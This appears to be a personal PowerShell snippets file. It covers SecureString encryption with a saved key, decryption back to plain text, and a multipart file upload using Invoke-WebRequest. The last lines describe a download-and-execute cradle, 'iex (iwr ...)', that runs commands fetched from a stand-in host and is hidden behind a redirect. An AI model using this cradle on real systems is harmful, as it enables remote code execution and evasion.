 #Convert data to secure string
 $secureString = ConvertTo-SecureString "testtest" -AsPlainText -Force
 
 #Standard encryption, using user creds
 $encryString = ConvertFrom-SecureString $secureString
 
 #Encrypt with key
 #Generate key
$EncryptionKeyBytes = New-Object Byte[] 32
[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($EncryptionKeyBytes)
$EncryptionKeyBytes | Out-File "Desktop/encryption.key"

#Use key to encrypt
$EncryptionKeyData = Get-Content "Desktop/encryption.key"
Get-Content plainstring.txt | ConvertTo-SecureString -AsPlainText -Force | `
ConvertFrom-SecureString -Key $EncryptionKeyData | Out-File -FilePath "Desktop/secret.encrypted"
#Use key to decrypt
$PasswordSecureString = Get-Content "Desktop/secret.encrypted" | ConvertTo-SecureString -Key $EncryptionKeyData
$PlainText = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR([System.Runtime.InteropServices.Marshal]::`
SecureStringToBSTR($PasswordSecureString))  | Out-File "Desktop/secret.decrypted"

#Split long line into multiple lines, use `
#IWR
#https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.3
#Upload file 
$FilePath = 'c:\document.txt'
$FieldName = 'document'
$ContentType = 'text/plain'

$FileStream = [System.IO.FileStream]::new($filePath, [System.IO.FileMode]::Open)
$FileHeader = [System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data')
$FileHeader.Name = $FieldName
$FileHeader.FileName = Split-Path -leaf $FilePath
$FileContent = [System.Net.Http.StreamContent]::new($FileStream)
$FileContent.Headers.ContentDisposition = $FileHeader
$FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse($ContentType)

$MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
$MultipartContent.Add($FileContent)

$Response = Invoke-WebRequest -Body $MultipartContent -Method 'POST' -Uri 'https://api.contoso.com/upload'


#Note that IWR follows redirects, so you can use this to run commands from yoursite. 
#Use header in redirect.php to redirect to command.txt, e.g. header('Location: command.txt');
powershell iex (iwr 'http://yoursite/redirect.php').content > outfile

